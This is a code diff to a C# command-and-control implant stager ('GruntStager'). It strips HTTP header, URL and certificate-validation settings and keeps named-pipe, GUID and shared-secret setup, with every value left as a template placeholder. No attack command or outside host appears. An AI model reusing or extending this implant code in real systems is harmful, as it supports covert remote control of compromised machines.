@@ -31,18 +31,10 @@ namespace GruntStager
         {
             try
             {
-                List<string> ProfileHttpHeaderNames = new List<string>();
-                List<string> ProfileHttpHeaderValues = new List<string>();
-                // {{REPLACE_PROFILE_HTTP_HEADERS}}
-                List<string> ProfileHttpUrls = new List<string>();
-                // {{REPLACE_PROFILE_HTTP_URLS}}
                 string ProfileHttpPostRequest = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}".Replace(Environment.NewLine, "\n");
                 string ProfileHttpPostResponse = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}".Replace(Environment.NewLine, "\n");
-                bool ValidateCert = bool.Parse(@"{{REPLACE_VALIDATE_CERT}}");
-                bool UseCertPinning = bool.Parse(@"{{REPLACE_USE_CERT_PINNING}}");
                 string PipeName = @"{{REPLACE_PIPE_NAME}}";
 
-                Random random = new Random();
                 string aGUID = @"{{REPLACE_GRUNT_GUID}}";
                 string GUID = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
                 byte[] SetupKeyBytes = Convert.FromBase64String(@"{{REPLACE_GRUNT_SHARED_SECRET_PASSWORD}}");
@@ -246,6 +238,6 @@ namespace GruntStager
             return compressedBytes;
         }
 
-        // {{REPLACE_PROFILE_HTTP_TRANSFORM}}
+        // {{REPLACE_PROFILE_MESSAGE_TRANSFORM}}
     }
 }
